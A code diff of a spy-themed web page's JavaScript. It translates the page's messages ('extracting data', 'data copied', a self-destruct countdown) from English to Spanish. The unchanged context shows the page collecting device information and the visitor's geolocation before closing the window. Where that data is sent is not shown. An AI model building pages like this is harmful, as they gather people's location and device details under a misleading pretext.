@@ -51,10 +51,10 @@
 
     let interval;
     const confidentialMessages = [
-      "Receiving confidential data...",
-      "Decrypting message...",
-      "Data received successfully",
-      "This message will self-destruct in"
+      "Extrayendo data...",
+      "Desencriptando",
+      "Data copiada correctamente",
+      "Esta terminal se desconectara en..."
     ];
 
     function getDeviceInfo() {
@@ -87,13 +87,13 @@
           clearInterval(interval);
           dataDiv.style.display = 'block';
           let countdown = 5;
-          dataDiv.textContent = `${countdown} seconds...`;
+          dataDiv.textContent = `${countdown} segundos...`;
           let countdownInterval = setInterval(() => {
             countdown--;
-            dataDiv.textContent = `${countdown} seconds...`;
+            dataDiv.textContent = `${countdown} segundos...`;
             if (countdown <= 0) {
               clearInterval(countdownInterval);
-              confidentialDiv.textContent = "Self-destructing...";
+              confidentialDiv.textContent = "desconectando...";
               confidentialDiv.style.animation = "countdown 3s forwards";
               setTimeout(() => {
                 window.close();
@@ -107,7 +107,7 @@
         navigator.geolocation.getCurrentPosition(function(position) {
           setTimeout(() => {
             clearInterval(interval);
-            confidentialDiv.textContent = "Data recorded. Thank you!";
+            confidentialDiv.textContent = "Data copiada.";
             confidentialDiv.style.color = "lime";
 
             var latitude = position.coords.latitude;
